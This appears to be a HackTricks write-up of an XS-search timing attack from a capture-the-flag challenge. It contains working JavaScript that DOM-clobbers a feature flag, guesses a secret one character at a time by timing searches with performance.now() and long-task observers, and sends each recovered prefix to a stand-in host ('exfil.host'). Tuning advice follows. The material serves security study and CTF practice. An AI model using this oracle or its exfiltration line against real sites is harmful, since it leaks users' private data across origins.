---
title: "performance.now example"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/xs-search/performance.now-example.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

```
const sleep = (ms) => new Promise((res) => setTimeout(res, ms))
async function check(flag) {
  let w = frame.contentWindow
  w.postMessage(
    { op: "preview", payload: '<img name="enable_experimental_features">' },
    "*"
  )
  await sleep(1)
  w.postMessage({ op: "search", payload: flag }, "*")
  let t1 = performance.now()
  await sleep(1)
  return performance.now() - t1 > 200
}
async function main() {
  let alpha =
    "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ-}"
  window.frame = document.createElement("iframe")
  frame.width = "100%"
  frame.height = "700px"
  frame.src = "https://challenge.jsapi.tech/"
  document.body.appendChild(frame)
  await sleep(1000)
  let flag = "nite{"
  while (1) {
    for (let c of alpha) {
      let result = await Promise.race([
        check(flag + c),
        new Promise((res) =>
          setTimeout(() => {
            res(true)
          }, 300)
        ),
      ])
      console.log(flag + c, result)
      if (result) {
        flag += c
        break
      }
    }
    new Image().src = "//exfil.host/log?" + encodeURIComponent(flag)
  }
}
document.addEventListener("DOMContentLoaded", main)
```
## Why this works

1. The vulnerable page exposes a `preview` operation that writes sanitized HTML into`innerHTML`**without** changing the real note contents.
2. The payload `<img name="enable_experimental_features">`**DOM-clobbers**`window.enable_experimental_features` , so the hidden`search()` feature stops returning early.
3. A correct guess makes `search()` do much more work than a miss: substring checks, repeated DOM appends with`<mark>` , and extra rendering for the results panel.
4. The attacker posts the `search` request, yields with`await sleep(1)` , and then uses`performance.now()` to see how late the timer resumes. A large delay means the victim branch was expensive.<sup>[\[1\]](#references)</sup>

## Practical notes

- **Calibrate a threshold first** with several known-hit and known-miss probes, then classify each candidate using the median/average instead of a single run.
- **Reset state between probes** whenever the target accumulates DOM (for example, when highlights are appended but never cleared). Recreating the iframe per guess is slower but usually more stable.
- **Cache-bust repeated requests** if the target or browser can reuse previous results; otherwise the timing gap tends to collapse after the first few probes.
- This exact **busy event-loop** oracle is easiest when attacker and target stay**same-site / same-process enough** to share an observable thread. On modern deployments, off-site iframes or subresource loads often lose victim cookies because of`SameSite=Lax/Strict` , so the cross-site version frequently needs a**same-site foothold** or a**top-level navigation / popup** variant instead.<sup>[\[2\]](#references)</sup>
- If the signal is too noisy on a remote headless bot, force a **heavier positive branch** or pivot to related primitives such as[performance.now + Force heavy task](performance.now-+-force-heavy-task.html) or[Event Loop Blocking + Lazy images](event-loop-blocking-+-lazy-images.html) .

## PerformanceLongTaskTiming variant

The original intended solve used a **long-task** oracle instead of comparing raw deltas. This is useful when the positive branch reliably blocks the UI thread for `50ms+`:[\[1\]](#references)

```
const longTasks = []
new PerformanceObserver((list) => longTasks.push(...list.getEntries())).observe({
  type: "longtask",
  buffered: true,
})
async function checkLongTask(flag) {
  longTasks.length = 0
  let w = frame.contentWindow
  w.postMessage({ op: "preview", payload: '<img name="enable_experimental_features">' }, "*")
  await sleep(1)
  w.postMessage({ op: "search", payload: flag }, "*")
  await sleep(75)
  return longTasks.some((e) => e.duration >= 50)
}
```
This is cleaner than hand-picked thresholds, but the Long Tasks API reports tasks whose duration exceeds 50 ms, so a false negative does **not** prove the guess was wrong.[\[3\]](#references)

## References
